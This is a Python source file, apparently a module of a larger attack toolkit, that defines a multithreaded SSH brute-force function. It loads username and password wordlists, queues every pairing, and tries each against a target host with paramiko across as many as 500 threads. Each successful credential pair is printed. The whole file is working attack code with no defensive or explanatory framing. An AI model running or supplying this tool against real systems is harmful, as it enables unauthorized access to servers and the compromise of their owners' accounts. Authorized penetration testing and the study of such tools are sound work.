import os
import paramiko
import threading
import queue
from utilities import *


def ssh_bruteforce(args):
    try:
        args.usernames = os.path.abspath(args.usernames)
        args.passwords = os.path.abspath(args.passwords)
        with open(args.usernames) as f:
            usernames = f.read().splitlines()
        with open(args.passwords, errors='ignore') as f:
            passwords = f.read().splitlines()

    except Exception as e:
        print(e)
        return True

    if args.threads is None:
        args.threads = 1
    try:
        if args.threads > 500:
            raise Exception
    except:
        print("The number of threads can't exceed 500")
        return True

    def try_login(username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(args.target, port=args.port, username=username, password=password)
            print(f"[+] Login Successful! {username}:{password}")
            ssh.close()
        except paramiko.ssh_exception.AuthenticationException:
            print(f"[-] Login Failed! {username}:{password}")
        except paramiko.ssh_exception.SSHException as e:
            print("An error has occured : ", e)
            pass

    def worker(q):
        while True:
            try:
                username, password = q.get(block=False)
            except queue.Empty:
                break
            try_login(username, password)
            q.task_done()

    q = queue.Queue()
    for username in usernames:
        for password in passwords:
            q.put((username, password))

    num_threads = args.threads
    threads = [threading.Thread(target=worker, args=(q,)) for _ in range(num_threads)]
    for t in threads:
        t.start()

    q.join()

    return True
